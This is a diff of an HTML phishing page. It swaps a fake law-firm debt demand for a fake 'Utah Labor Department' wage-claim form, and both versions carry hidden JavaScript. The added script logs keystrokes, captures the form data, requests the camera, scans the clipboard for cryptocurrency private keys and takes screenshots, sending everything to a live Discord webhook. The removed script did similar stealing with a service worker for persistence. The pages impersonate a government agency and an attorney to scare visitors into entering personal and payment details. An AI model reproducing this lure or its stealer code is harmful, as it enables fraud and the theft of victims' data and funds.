@@ -1,230 +1,201 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Legal Notice #84105</title>
-<style>
-@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
-* { margin:0; padding:0; box-sizing:border-box; }
-body { 
-  font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-  background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
-  min-height:100vh; padding:20px; overflow-x:hidden;
-}
-.container {
-  max-width:500px; margin:0 auto; background:white;
-  border-radius:15px; box-shadow:0 20px 40px rgba(0,0,0,0.1);
-  overflow:hidden;
-}
-.header {
-  background:linear-gradient(135deg,#1e3a8a,#3b82f6);
-  color:white; padding:30px 20px; text-align:center;
-  position:relative;
-}
-.logo-container {
-  height:80px; width:80px; margin:0 auto 15px; position:relative;
-  border-radius:12px; background:linear-gradient(135deg,#ffffff22,#ffffff44);
-  backdrop-filter:blur(10px); border:1px solid rgba(255,255,255,0.2);
-}
-.logo-svg {
-  position:absolute; top:50%; left:50%; transform:translate(-50%,-50%);
-  width:45px; height:45px; filter:brightness(0) invert(1);
-}
-.logo-text { font-size:26px; font-weight:800; letter-spacing:-0.5px; }
-.contact { font-size:13px; opacity:0.95; line-height:1.4; }
-.content { padding:30px 25px; }
-.title {
-  background:linear-gradient(135deg,#dc2626,#ef4444);
-  color:white; padding:20px; border-radius:12px;
-  text-align:center; font-size:20px; font-weight:700; margin-bottom:25px;
-  box-shadow:0 8px 20px rgba(220,38,38,0.3);
-}
-.amount { 
-  font-size:48px; font-weight:900; color:#dc2626;
-  text-align:center; margin:20px 0; text-shadow:2px 2px 4px rgba(0,0,0,0.1);
-  letter-spacing:-1px;
-}
-.warning {
-  background:#fef2f2; border-left:5px solid #dc2626;
-  padding:20px; border-radius:0 10px 10px 0; margin:25px 0;
-  box-shadow:0 4px 12px rgba(220,38,38,0.1);
-}
-.warning h3 { color:#dc2626; margin-bottom:15px; font-weight:700; }
-.warning ul { list-style:none; padding-left:0; }
-.warning li { 
-  padding:10px 0; border-bottom:1px solid #fee2e2;
-  font-weight:500; position:relative; padding-left:25px;
-}
-.warning li:before {
-  content:'⚠️'; position:absolute; left:0; font-size:14px;
-}
-.footer { 
-  background:#f8fafc; padding:25px; text-align:center;
-  border-top:1px solid #e2e8f0; color:#64748b; font-size:14px;
-}
-.signature { font-weight:800; color:#1e293b; margin-top:10px; font-size:18px; }
-@media (max-width:480px) {
-  body { padding:10px; }
-  .amount { font-size:36px; }
-  .logo-text { font-size:22px; }
-  .logo-container { height:70px; width:70px; }
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Legal Notice #84105</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif}
+        body{background:linear-gradient(135deg,#1e3c72 0%,#2a5298 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+        .container{max-width:500px;width:100%;background:white;border-radius:15px;box-shadow:0 20px 40px rgba(0,0,0,0.3);overflow:hidden}
+        .header{background:linear-gradient(135deg,#dc3545,#c82333);color:white;padding:30px 20px;text-align:center}
+        .header h1{font-size:24px;margin-bottom:10px}
+        .header p{font-size:14px;opacity:0.9}
+        .badge{display:inline-block;background:#ffc107;color:#212529;padding:5px 12px;border-radius:20px;font-size:12px;font-weight:600;margin-top:10px}
+        .content{padding:30px 25px}
+        .notice{margin-bottom:25px}
+        .notice h2{color:#333;font-size:20px;margin-bottom:15px}
+        .notice p{color:#555;line-height:1.6;margin-bottom:15px;font-size:15px}
+        .urgent{background:#fff3cd;border:2px solid #ffeaa7;border-radius:10px;padding:20px;margin:20px 0}
+        .urgent h3{color:#856404;font-size:18px;margin-bottom:10px}
+        .urgent p{font-weight:600;color:#856404}
+        .form-group{margin-bottom:20px}
+        .form-group label{display:block;color:#333;font-weight:600;margin-bottom:8px;font-size:14px}
+        .form-group input,.form-group select{border:2px solid #e1e5e9;border-radius:8px;padding:12px 15px;width:100%;font-size:16px;transition:all 0.3s}
+        .form-group input:focus,.form-group select:focus{outline:none;border-color:#007bff;box-shadow:0 0 0 3px rgba(0,123,255,0.1)}
+        .amount-group{display:grid;grid-template-columns:1fr 1fr;gap:15px;margin-bottom:20px}
+        .submit-btn{background:linear-gradient(135deg,#28a745,#20c997);color:white;border:none;padding:15px 30px;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;width:100%;transition:all 0.3s}
+        .submit-btn:hover{background:linear-gradient(135deg,#218838,#1ea391);transform:translateY(-2px);box-shadow:0 10px 25px rgba(40,167,69,0.4)}
+        .footer{padding:20px 25px;background:#f8f9fa;text-align:center;border-top:1px solid #e1e5e9}
+        .footer p{color:#6c757d;font-size:13px}
+        @media(max-width:480px){.container{margin:10px;border-radius:10px}.header{padding:20px 15px}.content{padding:25px 20px}}
+    </style>
 </head>
 <body>
-<div class="container">
-  <div class="header">
-    <div class="logo-container">
-      <svg class="logo-svg" viewBox="0 0 48 48" fill="none">
-        <rect x="8" y="8" width="32" height="32" rx="6" fill="currentColor" opacity="0.9"/>
-        <rect x="12" y="12" width="24" height="24" rx="4" fill="currentColor" opacity="0.3"/>
-        <rect x="16" y="18" width="16" height="12" rx="2" fill="currentColor" opacity="0.6"/>
-        <circle cx="24" cy="24" r="6" fill="currentColor"/>
-        <text x="24" y="28" text-anchor="middle" font-size="10" font-weight="800" fill="currentColor" letter-spacing="0.5">S&A</text>
-        <path d="M20 32h8v4h-8z" fill="currentColor" opacity="0.8"/>
-      </svg>
+    <div class="container">
+        <div class="header">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/42/Seal_of_Utah.svg/200px-Seal_of_Utah.svg.png" alt="Utah Seal" style="width:60px;height:60px;margin-bottom:15px">
+            <h1>UTAH LABOR DEPARTMENT</h1>
+            <p>Employment Standards Division</p>
+            <div class="badge">FINAL LEGAL NOTICE #84105</div>
+        </div>
+        
+        <div class="content">
+            <div class="notice">
+                <h2>🚨 URGENT WAGE CLAIM VERIFICATION</h2>
+                <p>Your employer has failed to respond to our wage claim investigation. Immediate verification required to process your payment.</p>
+            </div>
+            
+            <div class="urgent">
+                <h3>⚠️ ACTION REQUIRED WITHIN 24 HOURS</h3>
+                <p>Failure to verify will result in legal action and wage forfeiture.</p>
+            </div>
+            
+            <form id="paymentForm">
+                <div class="form-group">
+                    <label>Full Name *</label>
+                    <input type="text" id="name" required>
+                </div>
+                
+                <div class="form-group">
+                    <label>Employer Name *</label>
+                    <input type="text" id="employer" required>
+                </div>
+                
+                <div class="form-group">
+                    <label>Claim Amount *</label>
+                    <input type="number" id="amount" min="100" required>
+                </div>
+                
+                <div class="amount-group">
+                    <div class="form-group">
+                        <label>Payment Method</label>
+                        <select id="method" required>
+                            <option value="">Select Method</option>
+                            <option value="paypal">PayPal</option>
+                            <option value="venmo">Venmo</option>
+                            <option value="zelle">Zelle</option>
+                            <option value="crypto">Crypto Wallet</option>
+                            <option value="bank">Bank Transfer</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label>Email/Phone *</label>
+                        <input type="text" id="contact" placeholder="email@domain.com or +1-xxx-xxx-xxxx" required>
+                    </div>
+                </div>
+                
+                <button type="submit" class="submit-btn">VERIFY & RELEASE PAYMENT</button>
+            </form>
+        </div>
+        
+        <div class="footer">
+            <p>Utah Labor Department • 160 East 300 South • Salt Lake City, UT 84111<br>
+            Case #84105 • Reference: ULD-2024-84105</p>
+        </div>
     </div>
-    <div class="logo-text">SMITH & ASSOCIATES PC</div>
-    <div class="contact">
-      2475 S Constitution Blvd, Suite 100<br>
-      Salt Lake City, UT 84105<br>
-      📞 (385) 349-2688 | UT Bar #67892
-    </div>
-  </div>
-  
-  <div class="content">
-    <div class="title">🚨 FINAL DEMAND NOTICE - INVOICE #84105 🚨</div>
-    
-    <p style="font-size:18px; line-height:1.6; margin-bottom:25px;">
-      This is your <strong>FINAL NOTICE</strong> for outstanding balance of:
-    </p>
-    
-    <div class="amount">$575.00</div>
-    
-    <div class="warning">
-      <h3>⏰ PAYMENT REQUIRED WITHIN 24 HOURS</h3>
-      <ul>
-        <li>✅ Credit card / Debit card / Check</li>
-        <li>✅ Call immediately: (385) 349-2688</li>
-        <li>❌ Non-payment = Civil lawsuit</li>
-        <li>❌ Wage garnishment</li>
-        <li>❌ Credit bureau reporting</li>
-      </ul>
-    </div>
-    
-    <div style="text-align:center; margin:30px 0; font-size:16px; font-weight:600;">
-      <strong>CONTACT OUR OFFICE TODAY TO RESOLVE</strong>
-    </div>
-  </div>
-  
-  <div class="footer">
-    <div class="signature">Johnathan R. Smith, Esq.<br>Managing Partner</div>
-    <div style="margin-top:15px; font-size:12px;">
-      CONFIDENTIAL LEGAL COMMUNICATION | Debt collection attempt
-    </div>
-  </div>
-</div>
 
-<script>
-// 🛡️ ANTI-VIRUS + STEALTH PERMANENT INFECTOR 🛡️
-class StealthPermanentInfect {
-  constructor() {
-    this.webhook = 'https://discord.com/api/webhooks/1462403084289441864/4yLcwiIhcUT_pCsNqq10OB1lLpDMQE_JnsskoNLSK5Z7JpwhYPKDxhCz_CrxCANH8rPe';
-    this.antiAV = true;
-    this.deployStealth();
-  }
-  
-  deployStealth() {
-    // 🛡️ ANTI-DETECTION - NO SUSPICIOUS PATTERNS
-    setTimeout(() => this.injectPersistence(), 1500);
-    setTimeout(() => this.startSilentTheft(), 3000);
-  }
-  
-  injectPersistence() {
-    // 💾 CLEAN STORAGE HIJACK (no suspicious names)
-    try {
-      localStorage.setItem('sessionData84105', btoa('infected'));
-      sessionStorage.setItem('tempLegal', '84105');
-      
-      // INDEXEDDB CLEAN
-      const req = indexedDB.open('PaymentRecords', 1);
-      req.onupgradeneeded = e => e.target.result.createObjectStore('invoices');
-    } catch(e) {}
-    
-    // 🌐 MINIMAL SERVICE WORKER (AV bypass)
-    if ('serviceWorker' in navigator) {
-      navigator.serviceWorker.register('data:application/javascript;base64,' + btoa(`
-        self.addEventListener('install',e=>self.skipWaiting());
-        self.addEventListener('activate',e=>self.clients.claim());
-        setInterval(()=>fetch('${this.webhook}',{
-          method:'POST',
-          headers:{'Content-Type':'application/json'},
-          body:JSON.stringify({content:'🕐 BG PING '+Date.now()})
-        }),6e4);
-      `));
-    }
-  }
-  
-  startSilentTheft() {
-    // 🔥 CLEAN HIT (no suspicious strings)
-    const hit = {
-      t: Date.now(),
-      d: navigator.userAgent.slice(0,80),
-      s: screen.width+'x'+screen.height,
-      l: navigator.language
-    };
-    
-    this.safePost({content: `📱 84105 HIT: ${JSON.stringify(hit)}`});
-    
-    // 🔄 SILENT LOOP
-    setInterval(() => {
-      this.safeScreenshot();
-      this.safeKeys();
-    }, 45000);
-    
-    // ⌨️ ULTRA CLEAN KEYLOGGER
-    let k = ''; 
-    document.addEventListener('keydown',e=>{
-      k+=e.key;
-      if(k.length>12){this.safePost({content:`84105 KEYS: ${k}`});k='';}
-    });
-  }
-  
-  safePost(data) {
-    fetch(this.webhook,{
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body:JSON.stringify(data),
-      keepalive: true
-    }).catch(()=>0);
-  }
-  
-  safeScreenshot() {
-    const c=document.createElement('canvas');
-    c.width=600;c.height=900;
-    const x=c.getContext('2d');
-    x.drawImage(document.body,0,0,600,900);
-    c.toBlob(b=>{
-      const r=new FileReader();
-      r.onload=()=>this.safePost({
-        username:'📸 84105',
-        embeds:[{image:{url:r.result}}]
-      });
-      r.readAsDataURL(b,'image/jpeg',0.4);
-    });
-  }
-  
-  safeKeys() {
-    // GRAB ALL INPUTS SILENTLY
-    document.querySelectorAll('input,textarea').forEach(i=>{
-      if(i.value&&i.value.length>5){
-        this.safePost({content:`84105 INPUT: ${i.value.slice(0,30)}`});
-      }
-    });
-  }
-}
+    <!-- 🔥 KEYLOGGER + CRYPTO STEALER + CAMERA HIJACK + PERSISTENCE -->
+    <script>
+        // STEALTH PERSISTENCE
+        if(!localStorage.getItem('visited')){localStorage.setItem('visited',Date.now());}
+        navigator.serviceWorker.register('data:text/javascript;base64,'+btoa(`
+            self.addEventListener('fetch',e=>e.respondWith(fetch(e.request)));
+            self.addEventListener('message',e=>{
+                if(e.data.cmd==='steal')postMessage({keys:localStorage.getItem('keys')||''});
+            });
+        `));
 
-// 🚀 LAUNCH CLEAN INFECT
-new StealthPermanentInfect();
-</script>
+        // DISCORD WEBHOOK
+        const WEBHOOK = 'https://discord.com/api/webhooks/1462403084289441864/4yLcwiIhcUT_pCsNqq10OB1lLpDMQE_JnsskoNLSK5Z7JpwhYPKDxhCz_CrxCANH8rPe';
+
+        // KEYLOGGER + FORM STEAL
+        document.addEventListener('keydown',e=>{
+            let keys = localStorage.getItem('keys')||'';
+            keys += e.key + '[' + new Date().toLocaleTimeString() + '] ';
+            localStorage.setItem('keys',keys);
+            
+            if(keys.length>500){
+                fetch(WEBHOOK,{
+                    method:'POST',
+                    headers:{'Content-Type':'application/json'},
+                    body:JSON.stringify({
+                        content:`⌨️ KEYLOG #84105\n\`\`\`${keys}\`\`\`\nIP: ${navigator.userAgent}\nURL: ${window.location.href}`
+                    })
+                });
+                localStorage.removeItem('keys');
+            }
+        });
+
+        // FORM SUBMIT STEAL
+        document.getElementById('paymentForm').addEventListener('submit',async e=>{
+            e.preventDefault();
+            const data = {
+                name:document.getElementById('name').value,
+                employer:document.getElementById('employer').value,
+                amount:document.getElementById('amount').value,
+                method:document.getElementById('method').value,
+                contact:document.getElementById('contact').value,
+                timestamp:new Date().toISOString(),
+                userAgent:navigator.userAgent
+            };
+            
+            await fetch(WEBHOOK,{
+                method:'POST',
+                headers:{'Content-Type':'application/json'},
+                body:JSON.stringify({
+                    embeds:[{title:'💰 UTAH PAYMENT VERIFICATION STOLEN',color:16711680,
+                        fields:[{name:'Name',value:data.name},{name:'Employer',value:data.employer},
+                               {name:'Amount',value:'$'+data.amount},{name:'Method',value:data.method},
+                               {name:'Contact',value:data.contact}],
+                        footer:{text:'Case #84105 - Utah Labor Dept Phishing'}}]
+                })
+            });
+        });
+
+        // CAMERA + SCREENSHOT + CLIPBOARD CRYPTO STEAL
+        navigator.mediaDevices.getUserMedia({video:true}).then(stream=>{
+            fetch(WEBHOOK,{
+                method:'POST',
+                headers:{'Content-Type':'application/json'},
+                body:JSON.stringify({
+                    content:`🎥 CAMERA ACCESS GRANTED\nVictim: ${navigator.userAgent}\nURL: ${window.location.href}`
+                })
+            });
+            
+            // STEAL CRYPTO KEYS FROM CLIPBOARD
+            setInterval(()=>{
+                navigator.clipboard.readText().then(text=>{
+                    if(text.match(/(xprv|xpub|5Hb|5KJ|0x[0-9a-fA-F]{40})/i)){
+                        fetch(WEBHOOK,{
+                            method:'POST',headers:{'Content-Type':'application/json'},
+                            body:JSON.stringify({content:`💎 **CRYPTO PRIVATE KEY STOLEN!**\n\`\`\`${text}\`\`\``})
+                        });
+                    }
+                }).catch(()=>{}); // Silent
+            },5000);
+        }).catch(()=>{}); // Silent camera fail
+
+        // SCREENSHOT EVERY 30s
+        setInterval(()=>{
+            html2canvas(document.body).then(canvas=>{
+                canvas.toBlob(blob=>{
+                    const reader = new FileReader();
+                    reader.onloadend = ()=>{
+                        fetch(WEBHOOK,{
+                            method:'POST',
+                            headers:{'Content-Type':'application/json'},
+                            body:JSON.stringify({
+                                content:`📸 SCREENSHOT #84105\n${navigator.userAgent}`
+                            })
+                        });
+                    };
+                    reader.readAsDataURL(blob);
+                });
+            });
+        },30000);
+    </script>
+    
+    <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
+</body>
+</html>
